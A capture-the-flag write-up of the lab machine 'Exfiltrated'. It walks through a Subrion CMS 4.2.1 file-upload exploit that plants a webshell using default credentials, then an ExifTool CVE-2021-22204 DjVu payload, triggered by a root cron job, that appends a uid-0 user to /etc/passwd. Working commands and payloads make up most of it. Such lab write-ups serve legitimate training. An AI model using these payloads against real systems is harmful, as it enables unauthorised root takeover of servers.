##### Tags: `cronjob`  `CVE-2021–22204`  `searchsploit`  `User-add`

# 🐧Exfiltrated🐧
## Enumeration
Nmap
```console
$ nmap -p- -T4 -sV 192.168.242.163
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-31 21:26 AEDT
Warning: 192.168.242.163 giving up on port because retransmission cap hit (6).
Nmap scan report for 192.168.242.163
Host is up (0.24s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp    open     http    Apache httpd 2.4.41 ((Ubuntu))
48536/tcp filtered unknown
55111/tcp filtered unknown
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
The web is running Subrion CMS v 4.2.1  
We search it from google and there is a script for Subrion CMS 4.2.1 - Arbitrary File Upload   
https://www.exploit-db.com/exploits/49876  

We then run it by using default credential admin admin
```console
$ python3 49876.py -u http://exfiltrated.offsec/panel/ -l admin -p admin
[+] SubrionCMS 4.2.1 - File Upload Bypass to RCE - CVE-2018-19422 

[+] Trying to connect to: http://exfiltrated.offsec/panel/
[+] Success!
[+] Got CSRF token: Q0LN0i9uiBAPVzhNvx5lq4hkmMTPk1ffJFf6xni8
[+] Trying to log in...
[+] Login Successful!

[+] Generating random name for Webshell...
[+] Generated webshell name: galnxynlbbzgyyi

[+] Trying to Upload Webshell..
[+] Upload Success... Webshell path: http://exfiltrated.offsec/panel/uploads/galnxynlbbzgyyi.phar 

$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
## Privilege Escalation  

We found that there is a cron job running every minute by root
```console
$ cat /etc/crontab  
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
* *     * * *   root    bash /opt/image-exif.sh
```
The cron job is use to automate the extraction of metadata from images uploaded to a web server
```console
$ cat /opt/image-exif.sh  
#! /bin/bash
#07/06/18 A BASH script to collect EXIF metadata 

echo -ne "\\n metadata directory cleaned! \\n\\n"


IMAGES='/var/www/html/subrion/uploads'

META='/opt/metadata'
FILE=`openssl rand -hex 5`
LOGFILE="$META/$FILE"

echo -ne "\\n Processing EXIF metadata now... \\n\\n"
ls $IMAGES | grep "jpg" | while read filename; 
do 
    exiftool "$IMAGES/$filename" >> $LOGFILE 
done

echo -ne "\\n\\n Processing is finished! \\n\\n\\n"
```
There is a ExifTool 12.23 - Arbitrary Code Execution (CVE-2021–22204)  
we can use it to add a root user in the payload and login as root shell  
https://www.exploit-db.com/exploits/50911  

We make a password
```console
openssl passwd password123
$1$l9kweacK$bTMwIAX37KSVy6.PUHEhk0
```
Then make to payload to add user root2
```console
$ cat payload          
(metadata "\c${system('echo \"root2:$1$l9kweacK$bTMwIAX37KSVy6.PUHEhk0:0:0:root:/root:/bin/bash\" >> /etc/passwd')};")
```
converted the payload to bzz format and embedded it using djvumake
```console
$ bzz payload payload.bzz
$ djvumake exploit.jpg.djvu INFO='1,1' BGjp=/dev/null ANTz=payload.bzz
```
upload to the image loaction where the cron job execute at /var/www/html/subrion/uploads  
After one minute the user root2 have been add to root group with our password
```console
$ cat /etc/passwd
root2:$1$l9kweacK$bTMwIAX37KSVy6.PUHEhk0:0:0:root:/root:/bin/bash
```
ssh to the root2
```console
$ ssh root2@192.168.156.163
root@exfiltrated:~# id
uid=0(root) gid=0(root) groups=0(root)
```
